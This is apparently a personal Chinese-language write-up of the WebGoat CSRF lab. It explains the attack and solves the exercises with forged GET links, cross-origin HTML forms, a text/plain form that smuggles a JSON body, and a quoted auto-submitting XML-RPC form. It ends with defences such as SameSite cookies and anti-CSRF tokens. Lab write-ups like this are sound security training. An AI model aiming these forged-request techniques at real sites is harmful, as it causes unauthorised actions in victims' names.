---
id: 
title: Cross-Site Request Forgeries
---
<!-- muse start -->
Web Goat 对 CSRF 的简介。
使用表单发送 JSON 的实践，设置表单属性为`ENCTYPE=text/plain`并设置名值对的双引号来包裹两者之间的`=`，从而符合 JSON 格式。
<!-- muse end -->

## 1. 什么是跨站请求伪造？

跨站请求伪造，也称为一键攻击或会话挟持，缩写为 CSRF（有时读作 sea-surf）或 XSRF，是一种恶意利用网站的行为，即未经授权的命令从网站信任的用户处发出并传输。与利用用户对特定站点信任的跨站脚本攻击（XSS）不同，CSRF 利用的是站点对用户浏览器的信任。

跨站请求伪造是一种针对 Web 浏览器的“困惑代理”攻击。CSRF 通常具有以下特征：

-   它涉及依赖用户身份的站点。
-   它利用了站点对该身份的信任。
-   它诱骗用户的浏览器向目标站点发送 HTTP 请求。
-   它涉及具有副作用的 HTTP 请求。

面临风险的是那些基于来自受信任且已认证用户的输入来执行操作，但不需要用户授权该特定操作的 Web 应用程序。一个通过保存在用户 Web 浏览器中的 Cookie 完成身份认证的用户，可能会在不知情的情况下向信任该用户的站点发送 HTTP 请求，从而导致不必要的操作。

CSRF 攻击针对/滥用的是基本的 Web 功能。如果站点允许的操作会导致服务器端的状态改变，例如更改受害者的电子邮件地址或密码，或购买商品。强迫受害者检索数据对攻击者没有好处，因为攻击者接收不到响应，而受害者会收到。因此，CSRF 攻击针对的是状态变更请求。

让我们继续通过一些练习来探讨执行 CSRF 请求的方法。

## 2. 使用 GET 请求的 CSRF

这是最简单的 CSRF 攻击方式。例如，您收到一封包含以下内容的电子邮件：

`<a href="http://bank.com/transfer?account_number_from=123456789&account_number_to=987654321&amount=100000">View my Pictures!</a>`

如果用户仍处于 bank.com 网站的登录状态，这个简单的 GET 请求就会将资金从一个账户转移到另一个账户。当然，在大多数情况下，网站可能会有多重控制措施来审批该请求。

## 3. 基本 GET 请求 CSRF 练习

在登录状态下从外部源触发以下表单。响应将包含一个“flag”（数值）。

```html
<form accept-charset="UNKNOWN" id="basic-csrf-get" method="POST" name="form1" target="_blank" successcallback="" action="/WebGoat/csrf/basic-get-flag">
    <input name="csrf" type="hidden" value="false">
    <input type="submit" name="submit">
</form>
```

此处显示 Web Wolf 标志，使用服务器的上传文件功能
> `Each file will be available under the following url: http://:9090/WebWolf/files/{username}/{filename}.`

:x: 上传文件失败，响应 500

尝试在本地开启服务器，使用 vscode扩展 `Live Server - Ritwick Dey`
同时修改表单的目标地址为 Web Goat的端口，省略JavaScript的自动提交
`action="//localhost:3000/WebGoat/csrf/basic-get-flag"`

对html文件使用扩展服务器后，提交表单得到 flag

或者，在修改 `origin` 头部无效后发现：修改或移除 `Referer: http://localhost:3000/WebGoat/start.mvc?username=apkallus` 头部也可得到flag

## 4. 以他人身份发布评论

以下页面模拟了一个评论/评价页面。此处的不同之处在于，您需要像 CSRF 攻击那样从其他地方发起提交，就像之前的练习一样。这比您想象的要简单。在大多数情况下，更棘手的部分是找到您想要执行 CSRF 攻击的地方。经典的例子是在某人的银行账户中进行账户/电汇转账。

但我们这里保持简单。在这种情况下，您只需要以当前已登录用户的身份触发一次评论提交。

```html
<form class="attack-form" accept-charset="UNKNOWN" id="csrf-review" method="POST" name="review-form" successcallback="" action="/WebGoat/csrf/review">
    <input class="form-control" id="reviewText" name="reviewText" placeholder="Add a Review" type="text">
    <input class="form-control" id="reviewStars" name="stars" type="text">
    <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
    <input type="submit" name="submit" value="Submit review">
</form>
```


修改表单的目标地址为 Web Goat的端口，设置`input`元素的`value`字段，省略JavaScript的自动提交
```html
<form accept-charset="UNKNOWN" id="csrf-review" method="POST" name="review-form" successcallback="" action="//localhost:3000/WebGoat/csrf/review">
    <input id="reviewText" name="reviewText" placeholder="Add a Review" type="text" value="foooooooo">
    <input id="reviewStars" name="stars" type="text">
    <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
    <input type="submit" name="submit" value="Submit review">
</form>
```

## 5. 框架的自动支持

现在大多数框架都默认支持防止 CSRF。例如，Angular 默认情况下会通过一个拦截器从名为 `XSRF-TOKEN` 的 Cookie 中读取令牌，并将其设置为 HTTP 头 `X-XSRF-TOKEN`。由于只有运行在您域名下的代码才能读取该 Cookie，因此后端可以确信该 HTTP 请求是来自您的客户端应用程序，而非攻击者。

为了使此机制生效，后端服务器需要将令牌设置在一个 Cookie 中。由于 Angular（JavaScript）需要读取此 Cookie 的值，因此该 Cookie 不应标记 `http-only` 标志。在向服务器发起的每个请求中，Angular 都会将令牌放入 `X-XSRF-TOKEN` HTTP 头中。服务器可以验证这两个令牌是否匹配，这将确保请求来自同一域名。

**重要提示：请定义一个独立的 Cookie，切勿复用会话 Cookie**。

请记住，会话 Cookie 应始终定义为带有 `http-only` 标志。

即，攻击者控制的服务器仅发送请求自动携带的cookie，而无法读取目标站点的cookie来构造头部。
然而 cookie 可被读取这点这暴露了 XSS 的风险。

### 自定义请求头并不安全

另一种防御措施是为每次调用添加一个自定义请求头。如果所有与服务器的交互都是通过 JavaScript 执行的，那么这种方法会有效。在服务器端，您只需要检查是否存在此请求头，如果不存在则拒绝该请求。一些框架默认提供此实现，然而研究人员 Alex Infuhr 发现这种方法同样可以被绕过。您可以阅读相关内容：[Adobe Reader PDF – Client Side Request Injection](https://insert-script.blogspot.com/2018/05/adobe-reader-pdf-client-side-request.html)。


## 6. 但我只有JSON API，没有启用CORS，这些API怎么可能容易受到CSRF攻击呢？

许多Web应用程序没有实现对CSRF的保护，但它们由于只处理`application/json`作为内容类型而在某种程度上得到了保护。浏览器唯一能够发出这种内容类型请求的方式是使用XHR请求。在浏览器能够发出此类请求之前，会向服务器发出一个预检请求（记住CSRF请求是跨域的）。如果预检响应不允许跨域请求，浏览器将不会发起调用。

简而言之：这不是一个有效的CSRF保护。

为什么这种保护不够的一个例子可以在[这里](https://bugs.chromium.org/p/chromium/issues/detail?id=490015)找到。结果发现`Navigator.sendBeacon()`被允许发送具有任意内容类型的POST请求。

> navigator.sendBeacon()方法可以用来异步地将少量数据通过HTTP传输到Web服务器。此方法解决了分析和诊断代码的需求，这些代码通常尝试在文档卸载之前将数据发送到Web服务器。过早地发送数据可能会导致错过收集数据的机会…
>
> — developer.mozilla.org

例如：
```js
function postBeacon() {
    var data= new Blob([JSON.stringify({"author" :"WebGoat"})], {type : 'application/json'});
    navigator.sendBeacon("http://localhost:8083", data)
}
```

> 我认为内容类型限制对于因偶然原因而安全免受CSRF攻击的网站是有用的。它们并不是有意为之，但它们之所以安全，是因为它们碰巧只接受XML或JSON负载。
> 
> 也就是说，很明显依赖这种行为的网站应该被修复，任何有声誉的渗透测试人员都会指出这一点。问题在于是否是浏览器的责任，像保姆一样照顾脆弱的网站，还是我们应该让脆弱的网站成为伟大正义的牺牲品。适者生存。
> 
> 个人认为，答案介于两者之间，一个好的第一步是记录所有这些网站可能依赖其安全性的同源策略陷阱。
> 
> 但具体到这个bug，如果它从未得到修复，我认为这不会是世界末日。但另一方面，在这个时代，可能有一种方法可以通过XML RPC接口发射核导弹，所以可能这将是世界末日。
> 
> — Eduardo Vela

Firefox和Chrome都修复了这个问题，但这说明了你应该实现CSRF保护，而不是依赖API的内容类型。


## 7. CSRF 和 Content-Type

在上一节中，我们了解到依赖 Content-Type 并不能抵御 CSRF 攻击。在本节中，我们将探讨另一种针对未受 CSRF 保护的 API 执行 CSRF 攻击的方法。

在本次任务中，您需要将以下 JSON 消息发布到我们的端点：

```http
POST /WebGoat/csrf/feedback/message HTTP/1.1

{
  "name"    : "WebGoat",
  "email"   : "webgoat@webgoat.org",
  "content" : "WebGoat is the best!!"
}
```

更多信息可以在[这里](http://pentestmonkey.net/blog/csrf-xml-post-request)找到。请记住，您需要从另一个源（WebWolf 可以帮助您）发起请求，并且需要登录到 WebGoat。

链接中介绍了如何使用表单发送 XML 格式的信息，类似的也出现在 WSTG。
```html
<FORM NAME="buy" ENCTYPE="text/plain"
action="http://trade.example.com/xmlrpc/trade.rem" METHOD="POST">
<input type="hidden" name='<?xml version'
value='"1.0"?><methodCall><methodName>stocks.buy</methodName><params><param><value><string>MSFT</string></value></param><param><value><double>26</double></value></param></params></methodCall>'>
</FORM>
<script>document.buy.submit();</script>
```

即，设置表单属性 `ENCTYPE="text/plain"`，
并设置输入元素的`name`与`value`，将格式`name=value`中的多余`=`号包含在名与值各一个的`"`间，作为名或值的一部分的字符，从而保持 JSON 或 XML 格式不被破坏。
```html
<form accept-charset="UNKNOWN" method="POST" name="review-form" successcallback="" action="//localhost:3000/WebGoat/csrf/feedback/message" ENCTYPE="text/plain">
    <input type="submit" name='{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoat is the best!!","foo' value='":"bar"}'>
</form>
```
在本地服务器打开后提交得到成功响应
最终效果为
```http
POST /WebGoat/csrf/feedback/message HTTP/1.1
Host: localhost:3000
Content-Type: text/plain

{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoat is the best!!","foo=":"bar"}
```

## 登录CSRF攻击

在登录CSRF攻击中，攻击者使用其在该诚实站点上的用户名和密码，向该诚实站点伪造登录请求。如果伪造成功，诚实服务器将返回一个`Set-Cookie`头，指示浏览器通过存储会话Cookie来改变其状态，从而将用户以攻击者的身份登录到诚实站点。此会话Cookie用于将后续请求绑定到用户的会话，从而绑定到攻击者的认证凭证。登录CSRF攻击可能造成严重后果，例如，如下图所示：攻击者在google.com创建了一个账户，受害者访问了恶意网站，随后用户被以攻击者的身份登录。攻击者之后便可以收集关于该用户活动的信息。

![Login CSRF](./images/login-csrf.png)
*图：Login CSRF from Robust Defenses for Cross-Site Request Forgery*

更多信息请阅读以下[论文](http://seclab.stanford.edu/websec/csrf/csrf.pdf)。

在本任务中，尝试查看WebGoat是否也对登录CSRF攻击存在漏洞。请保持此标签页打开，并在另一个标签页中创建一个基于您当前用户名、并以前缀`csrf-`开头的新用户。因此，如果您的用户名是`tom`，则必须创建一个名为`csrf-tom`的新用户。

使用这个新用户登录。这模拟了攻击者利用CSRF所进行的操作。然后，返回原始标签页并点击按钮。由于您是以不同用户身份登录的，攻击者便会得知您点击了按钮。

## 9. CSRF 影响

其影响仅受限于已登录用户所能执行的操作（如果站点/功能/操作未得到适当保护）。真正容易受到 CSRF 攻击的领域是物联网设备和“智能”家电。遗憾的是，许多消费级路由器也被证明存在 CSRF 漏洞。

## CSRF 解决方案

### Same site Cookie 属性

这是一项现代浏览器支持的新扩展功能，它限制了 Cookie 的作用范围，使得 Cookie 仅在请求属于“same-site”请求时才会被附加。例如，如果请求是从 `webgoat.org` 发起的，那么对 `http://webgoat.org/something` 的请求将附加同站 Cookie。

它有两种模式：严格模式和宽松模式。严格模式不允许跨站请求，这意味着当您在 github.com 上并希望通过 Facebook 点赞（而 Facebook 将同站属性设置为严格）时，您将被重定向到登录页面，因为浏览器不会附加 Facebook 的 Cookie。更多信息可以在此处找到：`https://www.sjoerdlangkemper.nl/2016/04/14/preventing-csrf-with-samesite-cookie-attribute/`

### 其他防护措施

幸运的是，现在许多（Web）应用框架都内置了处理 CSRF 攻击的支持。例如，Spring 和 Tomcat 默认启用此功能。只要您不将其关闭（就像 WebGoat 中那样），您就应该能免受 CSRF 攻击。

有关 CSRF 防护的更多信息，请参阅以下链接：

https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html (防护/防御)

https://owasp.org/www-community/attacks/csrf (攻击)

https://tomcat.apache.org/tomcat-7.0-doc/config/filter.html#CSRF_Prevention_Filter / https://tomcat.apache.org/tomcat-8.0-doc/config/filter.html#CSRF_Prevention_Filter (Tomcat)

https://docs.spring.io/spring-security/site/docs/current/reference/html5/#csrf
